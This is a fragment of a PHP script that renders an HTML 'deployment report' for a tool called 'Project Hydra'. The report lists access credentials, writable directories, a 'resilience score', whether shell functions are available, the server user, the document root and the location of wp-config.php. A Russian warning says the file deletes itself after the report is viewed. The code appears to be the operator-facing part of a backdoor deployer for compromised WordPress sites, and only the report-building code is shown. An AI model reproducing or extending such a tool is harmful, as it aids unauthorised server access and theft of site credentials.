        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Project Hydra v21.0 - Deployment Report</title><style>body{font-family:\'Courier New\',monospace;background-color:#f4f4f4;color:#333;margin:20px}pre{white-space:pre-wrap;word-wrap:break-word;}.container{max-width:900px;margin:auto;background:white;padding:20px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,.1)}h1,h2,h3{color:#333;border-bottom:1px solid #eee;padding-bottom:10px}h1{text-align:center; border:none;}h3{font-size:1.1em; border-color:#f5f5f5; margin-top:20px;}.report-section{margin-bottom:20px}.report-item{margin-bottom:5px;word-wrap:break-word}.report-item strong{display:inline-block;width:220px}.status{padding:15px;border-radius:5px;text-align:center;font-size:1.2em;margin-top:20px}.access-info{background-color:#fff3cd;padding:15px;border-radius:5px;border-left:5px solid #ffeeba}ul{margin-top:10px;padding-left:20px;}li{margin-bottom:5px;}.path{font-family:monospace;background:#eee;padding:2px 5px;border-radius:3px}.warning{color:#dc3545;text-align:center;font-weight:bold;margin-top:20px}</style></head><body><div class="container">' .
             '<h1>Project Hydra v21.0 "Исправленная" - Deployment Report</h1><div class="warning">ВНИМАНИЕ: Этот файл будет удален после просмотра отчета. Сохраните все данные немедленно.</div>'.$error_html .
             '<div class="report-section"><h2>Access Credentials</h2>' . $access_html . '</div>' .
             '<div class="report-section">' . $writable_dirs_html . '</div>' .
             '<div class="report-section"><h2>Summary</h2><div class="report-item"><strong>Deployment Tactic:</strong> ' . htmlspecialchars($deployment_tactic_html) . '</div><div class="report-item"><strong>Resilience Score:</strong> ' . htmlspecialchars(@$report['summary']['resilience_score']) . '</div><div class="status" style="' . $status_css . '">' . htmlspecialchars(@$report['summary']['status']) . '</div></div>' .
             '<div class="report-section"><h2>Verification</h2>' . $verification_html_block . '</div>' .
             '<div class="report-section"><h2>Reconnaissance Data</h2><div class="report-item"><strong>Shell Functions Available:</strong> ' . (isset($report['system']['is_shell_available']) && $report['system']['is_shell_available'] ? $true_icon : $false_icon) . '</div><div class="report-item"><strong>Current User:</strong> <span class="path">' . @htmlspecialchars($report['system']['user']) . '</span></div><div class="report-item"><strong>Document Root:</strong> <span class="path">' . @htmlspecialchars($report['recon']['doc_root']) . '</span></div><div class="report-item"><strong>wp-config.php found:</strong> ' . $wp_config_found_html . ' at <span class="path">' . @htmlspecialchars(@$report['recon']['wp_config']['path']) . "</span></div></div></div></body></html>";
    }
}
?>